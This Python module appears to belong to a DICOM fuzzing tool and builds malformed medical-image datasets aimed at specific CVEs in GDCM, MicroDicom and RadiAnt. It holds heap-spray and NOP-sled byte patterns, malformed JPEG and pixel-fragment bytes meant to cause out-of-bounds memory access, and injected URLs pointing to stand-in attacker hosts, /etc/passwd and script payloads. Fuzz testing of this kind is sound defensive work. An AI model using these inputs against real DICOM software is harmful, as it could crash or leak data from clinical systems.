"""Security Patterns for CVE-specific DICOM vulnerabilities

This module implements specific vulnerability patterns based on real-world CVEs:
- CVE-2025-5943: MicroDicom out-of-bounds write during header parsing
- CVE-2025-53619: GDCM out-of-bounds read in JPEGBITSCodec (info leak)
- CVE-2025-53618: GDCM out-of-bounds read in JPEG decompression
- CVE-2025-11266: GDCM out-of-bounds write in encapsulated PixelData
- CVE-2025-1001: RadiAnt DICOM Viewer MitM via unverified certificates

SECURITY CONTEXT:
These patterns target known vulnerabilities in DICOM parsers and viewers,
helping identify similar issues in other implementations.
"""

import random
import struct

from pydicom.dataset import Dataset
from pydicom.tag import Tag
from pydicom.uid import UID

from dicom_fuzzer.utils.logger import get_logger

logger = get_logger(__name__)


class SecurityPatternFuzzer:
    """Implements specific security vulnerability patterns for DICOM fuzzing.

    This fuzzer targets known vulnerability patterns in DICOM parsers,
    particularly focusing on memory corruption vulnerabilities.
    """

    def __init__(self) -> None:
        """Initialize security pattern fuzzer with attack patterns."""
        # CVE-2025-5943 specific patterns
        self.oversized_vr_lengths = [
            0xFFFF,  # Max 16-bit value
            0xFFFE,  # One less than max
            0x8000,  # Boundary value
            0x7FFF,  # Max positive 16-bit signed
            0x10000,  # Just over 16-bit
            0x100000,  # Large value
        ]

        # Common heap spray patterns
        self.heap_spray_patterns = [
            b"\x0c\x0c\x0c\x0c" * 256,  # Classic heap spray NOP sled
            b"\x90" * 1024,  # x86 NOP instructions
            b"\x41" * 512,  # ASCII 'A' pattern
            b"\xeb\xfe" * 256,  # Jump to self (infinite loop)
            b"\xcc" * 512,  # INT3 breakpoints
        ]

        # Malformed VR codes that might trigger parsing errors
        self.malformed_vr_codes = [
            b"\x00\x00",  # Null VR
            b"\xff\xff",  # Invalid VR
            b"XX",  # Non-standard VR
            b"ZZ",  # Non-standard VR
            b"\x41\x41",  # AA in hex
        ]

    def apply_cve_2025_5943_pattern(self, dataset: Dataset) -> Dataset:
        """Apply CVE-2025-5943 specific vulnerability patterns.

        This pattern targets out-of-bounds write vulnerabilities in DICOM
        header parsing by creating oversized VR length fields.

        Args:
            dataset: DICOM dataset to mutate

        Returns:
            Mutated dataset with CVE-2025-5943 patterns

        """
        # Target specific tags that are commonly parsed early
        vulnerable_tags = [
            (0x0008, 0x0005),  # SpecificCharacterSet
            (0x0008, 0x0008),  # ImageType
            (0x0008, 0x0016),  # SOPClassUID
            (0x0008, 0x0018),  # SOPInstanceUID
            (0x0008, 0x0020),  # StudyDate
            (0x0008, 0x0030),  # StudyTime
            (0x0008, 0x0050),  # AccessionNumber
            (0x0008, 0x0060),  # Modality
            (0x0008, 0x0070),  # Manufacturer
            (0x0008, 0x0090),  # ReferringPhysicianName
        ]

        # Select random tags to mutate
        tags_to_mutate = random.sample(
            vulnerable_tags, min(random.randint(1, 3), len(vulnerable_tags))
        )

        for tag_tuple in tags_to_mutate:
            tag = Tag(tag_tuple)
            if tag in dataset:
                # Create oversized value for this tag
                oversized_length = random.choice(self.oversized_vr_lengths)

                # Generate payload that might trigger overflow
                if oversized_length <= 0x10000:
                    # For reasonable sizes, create actual data
                    payload = b"A" * min(oversized_length, 0x8000)
                else:
                    # For huge sizes, create a smaller payload
                    # (the length field itself is the attack vector)
                    payload = b"B" * 1024

                try:
                    # Attempt to set oversized value
                    # This bypasses normal validation
                    elem = dataset[tag]
                    elem._value = payload

                    # Also try to corrupt the VR field directly if possible
                    if hasattr(elem, "VR"):
                        # Set invalid VR that might confuse length calculation
                        elem.VR = "UN"  # Unknown VR allows arbitrary length
                except Exception as e:
                    # Some tags might be protected, skip them
                    logger.debug(f"Failed to corrupt tag {tag}: {e}")

        return dataset

    def apply_heap_spray_pattern(self, dataset: Dataset) -> Dataset:
        """Apply heap spray patterns to facilitate exploitation.

        Heap spraying is a technique used to facilitate exploitation of
        memory corruption vulnerabilities by filling memory with predictable data.

        Args:
            dataset: DICOM dataset to mutate

        Returns:
            Mutated dataset with heap spray patterns

        """
        # Target large data fields that can hold spray patterns
        spray_targets = [
            "PixelData",  # Large binary data
            "OverlayData",  # Overlay pixel data
            "CurveData",  # Curve data (deprecated but still parsed)
            "WaveformData",  # Waveform data
            "EncapsulatedDocument",  # Encapsulated PDF/CDA
            "IconImageSequence",  # Icon image data
        ]

        for field_name in spray_targets:
            if hasattr(dataset, field_name):
                # Select a heap spray pattern
                spray_pattern = random.choice(self.heap_spray_patterns)

                # Optionally combine with shellcode-like patterns
                if random.random() > 0.7:
                    # Add some shellcode-like signatures (harmless)
                    spray_pattern = (
                        b"\xeb\x0e"  # JMP 14 bytes
                        + b"\x90" * 12  # NOP sled
                        + spray_pattern
                    )

                try:
                    setattr(dataset, field_name, spray_pattern)
                except Exception as e:
                    # Some fields might have strict validation
                    logger.debug(f"Failed to set field {field_name}: {e}")

        # Also try to spray in string fields with large capacity
        string_spray_targets = [
            "ImageComments",
            "StudyComments",
            "InterpretationText",
            "TextString",
        ]

        for field_name in string_spray_targets:
            if hasattr(dataset, field_name):
                # Create string-based spray pattern
                spray_str = "A" * 1024 + "B" * 1024 + "C" * 1024
                try:
                    setattr(dataset, field_name, spray_str)
                except Exception as e:
                    logger.debug(f"Failed to spray field {field_name}: {e}")

        return dataset

    def apply_malformed_vr_pattern(self, dataset: Dataset) -> Dataset:
        """Apply malformed Value Representation (VR) patterns.

        Malformed VR codes can trigger parsing errors and potentially
        lead to memory corruption if not properly validated.

        Args:
            dataset: DICOM dataset to mutate

        Returns:
            Mutated dataset with malformed VR patterns

        """
        # Target commonly parsed tags
        target_tags = list(dataset.keys())[:10]  # First 10 tags

        for tag in random.sample(target_tags, min(3, len(target_tags))):
            elem = dataset[tag]

            try:
                # Try to set malformed VR
                malformed_vr = random.choice(
                    [
                        "XX",  # Invalid VR code
                        "ZZ",  # Invalid VR code
                        "??",  # Non-standard
                        "\x00\x00",  # Null bytes
                        "UN",  # Unknown (might bypass validation)
                    ]
                )

                # Force VR change (this might not always work due to pydicom protection)
                elem.VR = malformed_vr

                # Also try to set value that doesn't match VR type
                if malformed_vr == "UN":
                    # Unknown VR can contain arbitrary data
                    elem._value = b"\x00" * 256 + b"\xff" * 256

            except Exception as e:
                # Expected - pydicom has protections
                logger.debug(f"VR malformation blocked by pydicom: {e}")

        return dataset

    def apply_integer_overflow_pattern(self, dataset: Dataset) -> Dataset:
        """Apply integer overflow patterns in length and size fields.

        Integer overflows in size calculations can lead to buffer overflows
        and heap corruption vulnerabilities.

        Args:
            dataset: DICOM dataset to mutate

        Returns:
            Mutated dataset with integer overflow patterns

        """
        # Target size-related fields
        overflow_targets = {
            "Rows": [0, 1, 0x7FFF, 0x8000, 0xFFFF, 0x10000],
            "Columns": [0, 1, 0x7FFF, 0x8000, 0xFFFF, 0x10000],
            "BitsAllocated": [0, 1, 8, 16, 32, 64, 128, 256],
            "BitsStored": [0, 1, 8, 16, 32, 64, 128, 256],
            "HighBit": [0, 7, 15, 31, 63, 127, 255],
            "PixelRepresentation": [-1, 0, 1, 2, 127, 128, 255, 256],
            "SamplesPerPixel": [0, 1, 3, 4, 255, 256, 65535],
            "NumberOfFrames": [0, 1, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFF],
        }

        for field_name, overflow_values in overflow_targets.items():
            if hasattr(dataset, field_name):
                # Select an overflow-inducing value
                overflow_value = random.choice(overflow_values)

                try:
                    setattr(dataset, field_name, overflow_value)

                    # Special case: if setting image dimensions, also adjust PixelData
                    if field_name in ["Rows", "Columns"] and hasattr(
                        dataset, "PixelData"
                    ):
                        # Create mismatched PixelData size to trigger calculations
                        if overflow_value > 0 and overflow_value < 0x1000:
                            # Create undersized data
                            dataset.PixelData = b"\x00" * 100
                        elif overflow_value >= 0x8000:
                            # Create oversized data
                            dataset.PixelData = b"\xff" * 0x10000

                except Exception as e:
                    logger.debug(f"Integer overflow pattern failed: {e}")

        return dataset

    def apply_sequence_depth_attack(self, dataset: Dataset) -> Dataset:
        """Apply deeply nested sequence patterns to trigger stack overflow.

        Deeply nested sequences can cause stack overflow in recursive parsers
        or excessive memory allocation.

        Args:
            dataset: DICOM dataset to mutate

        Returns:
            Mutated dataset with deeply nested sequences

        """
        from pydicom.sequence import Sequence

        # Create deeply nested sequence
        depth = random.randint(10, 100)

        # Build nested structure - start from innermost and work outward
        deepest_ds = Dataset()
        deepest_ds.Manufacturer = f"Level_{depth - 1}"

        # Create the nested structure from the inside out
        current_level = Sequence([deepest_ds])

        for i in range(depth - 2, -1, -1):
            parent_ds = Dataset()
            parent_ds.Manufacturer = f"Level_{i}"
            # Create proper DataElement for sequence
            from pydicom.dataelem import DataElement

            parent_ds[Tag(0x0008, 0x1140)] = DataElement(
                Tag(0x0008, 0x1140), "SQ", current_level
            )
            current_level = Sequence([parent_ds])

        # Add the deeply nested sequence to dataset
        try:
            # Remove existing sequence if present
            if Tag(0x0008, 0x1140) in dataset:
                del dataset[Tag(0x0008, 0x1140)]

            # Create proper DataElement for sequence
            from pydicom.dataelem import DataElement

            dataset[Tag(0x0008, 0x1140)] = DataElement(
                Tag(0x0008, 0x1140), "SQ", current_level
            )
        except Exception as e:
            logger.debug(f"Sequence depth attack failed: {e}")

        return dataset

    def apply_encoding_confusion_pattern(self, dataset: Dataset) -> Dataset:
        """Apply encoding confusion patterns to trigger parsing errors.

        Mixed or invalid character encodings can cause buffer overflows
        in string processing routines.

        Args:
            dataset: DICOM dataset to mutate

        Returns:
            Mutated dataset with encoding confusion patterns

        """
        # Define problematic encoding patterns
        encoding_attacks = [
            b"\xff\xfe\x00\x00",  # UTF-32 LE BOM
            b"\x00\x00\xfe\xff",  # UTF-32 BE BOM
            b"\xff\xfe",  # UTF-16 LE BOM
            b"\xfe\xff",  # UTF-16 BE BOM
            b"\xef\xbb\xbf",  # UTF-8 BOM
            b"\x00" * 10,  # Null bytes
            bytes(range(256)),  # All byte values
            b"\x80" * 100,  # Invalid UTF-8 continuation bytes
        ]

        # Set confusing SpecificCharacterSet
        if hasattr(dataset, "SpecificCharacterSet"):
            confused_charsets = [
                "ISO-IR 100\\ISO-IR 144",  # Mixed Latin1 and Russian
                "\\".join(
                    [f"ISO-IR {i}" for i in range(100, 200, 10)]
                ),  # Many charsets
                "INVALID_CHARSET",  # Non-existent
                "",  # Empty
                "\\",  # Just delimiter
                "ISO-IR 192",  # UTF-8 (might not be supported everywhere)
            ]
            dataset.SpecificCharacterSet = random.choice(confused_charsets)

        # Apply encoding attacks to string fields
        string_fields = [
            "PatientName",
            "PatientID",
            "StudyDescription",
            "SeriesDescription",
            "Manufacturer",
            "InstitutionName",
        ]

        for field_name in string_fields:
            if hasattr(dataset, field_name):
                attack_bytes = random.choice(encoding_attacks)

                try:
                    # Try to set raw bytes (might fail due to encoding validation)
                    elem = dataset.data_element(field_name)
                    if elem is not None:
                        elem._value = attack_bytes
                except Exception as e:
                    # Fall back to setting confusing but valid strings
                    logger.debug(
                        f"Raw bytes encoding attack failed for {field_name}: {e}"
                    )
                    try:
                        # Unicode normalization attacks
                        confusing_strings = [
                            "\u0041\u0301",  # A with combining accent
                            "\ufeff" * 10,  # Zero-width no-break spaces
                            "\u202e" + "Hello",  # Right-to-left override
                            "\x00Test",  # Embedded null
                            "A" + "\x00" + "B",  # Null in middle
                        ]
                        setattr(dataset, field_name, random.choice(confusing_strings))
                    except Exception as e2:
                        logger.debug(
                            f"Unicode confusion fallback also failed for {field_name}: {e2}"
                        )

        return dataset

    def apply_cve_2025_53619_pattern(self, dataset: Dataset) -> Dataset:
        """Apply CVE-2025-53619 specific vulnerability patterns.

        CVE-2025-53619 affects Grassroot DICOM (GDCM) and involves an out-of-bounds
        read in JPEGBITSCodec::InternalCode functionality. A specially crafted DICOM
        file can lead to information leakage.

        Attack vector: Malformed JPEG-encoded pixel data causing memory read beyond
        buffer boundaries during decompression.

        Args:
            dataset: DICOM dataset to mutate

        Returns:
            Mutated dataset with CVE-2025-53619 patterns

        """
        # Target JPEG-related transfer syntaxes
        jpeg_transfer_syntaxes = [
            "1.2.840.10008.1.2.4.50",  # JPEG Baseline
            "1.2.840.10008.1.2.4.51",  # JPEG Extended
            "1.2.840.10008.1.2.4.57",  # JPEG Lossless
            "1.2.840.10008.1.2.4.70",  # JPEG Lossless SV1
            "1.2.840.10008.1.2.4.80",  # JPEG-LS Lossless
            "1.2.840.10008.1.2.4.81",  # JPEG-LS Near-Lossless
            "1.2.840.10008.1.2.4.90",  # JPEG 2000 Lossless
            "1.2.840.10008.1.2.4.91",  # JPEG 2000 Lossy
        ]

        # Set JPEG transfer syntax if possible
        if hasattr(dataset, "file_meta"):
            try:
                dataset.file_meta.TransferSyntaxUID = UID(
                    random.choice(jpeg_transfer_syntaxes)
                )
            except Exception:
                # Transfer syntax setting is optional; continue with attack patterns
                pass

        # Create malformed JPEG marker sequences
        jpeg_attack_patterns = [
            # Truncated SOI marker
            b"\xff\xd8",
            # Invalid JPEG markers
            b"\xff\xd8\xff\xfe\xff\xff\xff\xff",
            # Malformed SOS (Start of Scan) with invalid component count
            b"\xff\xd8\xff\xda\x00\x08\xff\x00\x00\x00\x00\x00",
            # DHT with invalid length
            b"\xff\xd8\xff\xc4\xff\xff" + b"\x00" * 100,
            # DQT with malformed quantization table
            b"\xff\xd8\xff\xdb\x00\x43" + b"\xff" * 64,
            # SOF with huge dimensions (integer overflow trigger)
            b"\xff\xd8\xff\xc0\x00\x0b\x08\xff\xff\xff\xff\x01\x01\x11\x00",
            # Nested SOI markers (parser confusion)
            b"\xff\xd8" * 10 + b"\xff\xd9",
        ]

        # Apply to PixelData if present
        if hasattr(dataset, "PixelData"):
            attack_payload = random.choice(jpeg_attack_patterns)
            # Combine with existing data or create new
            try:
                # Create encapsulated pixel data format
                # Basic Offset Table (empty) + Fragment
                encapsulated = (
                    b"\xfe\xff\x00\xe0\x00\x00\x00\x00"  # Basic Offset Table
                    + b"\xfe\xff\x00\xe0"  # Item tag
                    + struct.pack("<L", len(attack_payload))  # Length
                    + attack_payload
                    + b"\xfe\xff\xdd\xe0\x00\x00\x00\x00"  # Sequence delimiter
                )
                dataset.PixelData = encapsulated
            except Exception as e:
                logger.debug(f"CVE-2025-53619 pattern failed: {e}")

        return dataset

    def apply_cve_2025_1001_pattern(self, dataset: Dataset) -> Dataset:
        """Apply CVE-2025-1001 specific vulnerability patterns.

        CVE-2025-1001 affects Medixant RadiAnt DICOM Viewer and involves
        failure to verify update server certificates, enabling MitM attacks.

        While this CVE is about update verification, we can test for related
        trust issues in DICOM metadata that might reference external URLs.

        Args:
            dataset: DICOM dataset to mutate

        Returns:
            Mutated dataset with CVE-2025-1001 related patterns

        """
        # URL injection targets in DICOM metadata
        malicious_urls = [
            "http://evil.com/update.exe",
            "https://attacker.local/dicom.dcm",
            "file:///etc/passwd",
            "ftp://malicious.server/payload",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "\\\\attacker.com\\share\\malware.exe",  # UNC path
        ]

        # URL-containing fields in DICOM
        url_fields = [
            "RetrieveURL",
            "RetrieveLocationUID",
            "StorageMediaFileSetID",
            "StorageMediaFileSetUID",
            "HL7InstanceIdentifier",
            "ReferencedSOPInstanceUID",
            "SourceApplicationEntityTitle",
            "DestinationAE",
        ]

        for field_name in url_fields:
            if random.random() < 0.3:  # 30% chance to inject
                try:
                    malicious_url = random.choice(malicious_urls)
                    setattr(dataset, field_name, malicious_url)
                except Exception as e:
                    logger.debug(f"URL injection failed for {field_name}: {e}")

        # Also inject in Private Creator elements which may be parsed as URLs
        private_groups = [0x0009, 0x0011, 0x0013, 0x0015]
        for group in random.sample(private_groups, 2):
            try:
                from pydicom.dataelem import DataElement
                from pydicom.tag import Tag

                # Private creator
                creator_tag = Tag(group, 0x0010)
                dataset[creator_tag] = DataElement(
                    creator_tag, "LO", "MALICIOUS URL INJECTION"
                )
                # Private element with URL
                data_tag = Tag(group, 0x1000)
                dataset[data_tag] = DataElement(
                    data_tag, "LO", random.choice(malicious_urls)
                )
            except Exception as e:
                logger.debug(f"Private element injection failed: {e}")

        return dataset

    def apply_cve_2025_11266_pattern(self, dataset: Dataset) -> Dataset:
        """Apply CVE-2025-11266 specific vulnerability patterns.

        CVE-2025-11266 affects GDCM and involves out-of-bounds write during
        parsing of malformed DICOM files with encapsulated PixelData fragments.
        The issue is triggered by unsigned integer underflow in buffer indexing.

        Args:
            dataset: DICOM dataset to mutate

        Returns:
            Mutated dataset with CVE-2025-11266 patterns

        """
        # Create malformed encapsulated pixel data fragments
        fragment_attacks = [
            # Fragment with length causing integer underflow (0xFFFFFFFF - small)
            b"\xfe\xff\x00\xe0\xff\xff\xff\xff",
            # Zero-length fragment followed by huge length
            b"\xfe\xff\x00\xe0\x00\x00\x00\x00" + b"\xfe\xff\x00\xe0\xff\xff\xff\x7f",
            # Negative offset simulation via unsigned underflow
            b"\xfe\xff\x00\xe0" + struct.pack("<L", 0xFFFFFFFE),  # -2 as unsigned
            # Many small fragments to exhaust counter
            (b"\xfe\xff\x00\xe0\x01\x00\x00\x00\x00") * 1000,
            # Misaligned fragment boundaries
            b"\xfe\xff\x00\xe0\x03\x00\x00\x00ABC"  # Odd length
            + b"\xfe\xff\x00\xe0\x05\x00\x00\x00DEFGH",
        ]

        # Apply to PixelData
        if hasattr(dataset, "PixelData") or random.random() < 0.5:
            try:
                # Basic Offset Table (malformed)
                offset_table = b"\xfe\xff\x00\xe0"
                # Corrupt offset table length
                offset_table += struct.pack(
                    "<L",
                    random.choice(
                        [
                            0xFFFFFFFF,  # Max value
                            0x7FFFFFFF,  # Max signed
                            0x80000000,  # Min signed (as unsigned)
                            0xFFFFFFFE,  # Near max
                        ]
                    ),
                )

                # Add attack fragment
                attack = random.choice(fragment_attacks)

                # Sequence delimiter
                delimiter = b"\xfe\xff\xdd\xe0\x00\x00\x00\x00"

                dataset.PixelData = offset_table + attack + delimiter

                # Set encapsulated transfer syntax
                if hasattr(dataset, "file_meta"):
                    dataset.file_meta.TransferSyntaxUID = UID("1.2.840.10008.1.2.4.50")

            except Exception as e:
                logger.debug(f"CVE-2025-11266 pattern failed: {e}")

        return dataset

    def apply_cve_2025_53618_pattern(self, dataset: Dataset) -> Dataset:
        """Apply CVE-2025-53618 specific vulnerability patterns.

        CVE-2025-53618 affects GDCM's JPEGBITSCodec and causes out-of-bounds read
        during JPEG decompression, potentially leaking sensitive memory contents.

        Similar to CVE-2025-53619 but with different trigger conditions.

        Args:
            dataset: DICOM dataset to mutate

        Returns:
            Mutated dataset with CVE-2025-53618 patterns

        """
        # Specific JPEG bit-stream corruptions that trigger OOB read
        jpeg_bitstream_attacks = [
            # Corrupted Huffman table with invalid code lengths
            b"\xff\xd8\xff\xc4\x00\x1f\x00"
            + bytes([0x10] * 16)  # Invalid Huffman lengths
            + b"\x00" * 12,
            # DHT with code count exceeding table size
            b"\xff\xd8\xff\xc4\x01\x00\x00"
            + bytes([0xFF] * 16)  # All max counts
            + b"\x00" * 200,
            # Invalid restart interval with malformed RST markers
            b"\xff\xd8\xff\xdd\x00\x04\xff\xff"
            + b"\xff\xd0" * 100,  # Many RST0 markers
            # Corrupted arithmetic coding marker (JPEG arithmetic)
            b"\xff\xd8\xff\xcc\x00\xff" + b"\xff" * 50,
            # SOF with invalid precision and component info
            b"\xff\xd8\xff\xc1\x00\x11\x10"  # 16-bit precision
            + b"\x00\x10\x00\x10"  # 16x16
            + b"\x04"  # 4 components (unusual)
            + b"\x01\x44\x00"  # Component with unusual sampling
            + b"\x02\x44\x01"
            + b"\x03\x44\x02"
            + b"\x04\x44\x03",
        ]

        # Apply attack pattern
        if hasattr(dataset, "PixelData") or random.random() < 0.5:
            try:
                attack_payload = random.choice(jpeg_bitstream_attacks)

                # Wrap in encapsulated format
                encapsulated = (
                    b"\xfe\xff\x00\xe0\x00\x00\x00\x00"  # Empty BOT
                    + b"\xfe\xff\x00\xe0"
                    + struct.pack("<L", len(attack_payload))
                    + attack_payload
                    + b"\xfe\xff\xdd\xe0\x00\x00\x00\x00"
                )

                dataset.PixelData = encapsulated

                # Set JPEG transfer syntax
                if hasattr(dataset, "file_meta"):
                    dataset.file_meta.TransferSyntaxUID = UID("1.2.840.10008.1.2.4.50")

            except Exception as e:
                logger.debug(f"CVE-2025-53618 pattern failed: {e}")

        return dataset

    def apply_all_patterns(self, dataset: Dataset) -> Dataset:
        """Apply all security patterns to create comprehensive test case.

        Args:
            dataset: DICOM dataset to mutate

        Returns:
            Mutated dataset with multiple security patterns applied

        """
        # List of all pattern application methods
        patterns = [
            self.apply_cve_2025_5943_pattern,
            self.apply_cve_2025_53619_pattern,
            self.apply_cve_2025_53618_pattern,
            self.apply_cve_2025_11266_pattern,
            self.apply_cve_2025_1001_pattern,
            self.apply_heap_spray_pattern,
            self.apply_malformed_vr_pattern,
            self.apply_integer_overflow_pattern,
            self.apply_sequence_depth_attack,
            self.apply_encoding_confusion_pattern,
        ]

        # Apply 1-4 random patterns
        num_patterns = random.randint(1, 4)
        selected_patterns = random.sample(patterns, min(num_patterns, len(patterns)))

        for pattern_func in selected_patterns:
            try:
                dataset = pattern_func(dataset)
            except Exception as e:
                # Continue with other patterns if one fails
                logger.debug(f"Pattern {pattern_func.__name__} failed: {e}")

        return dataset
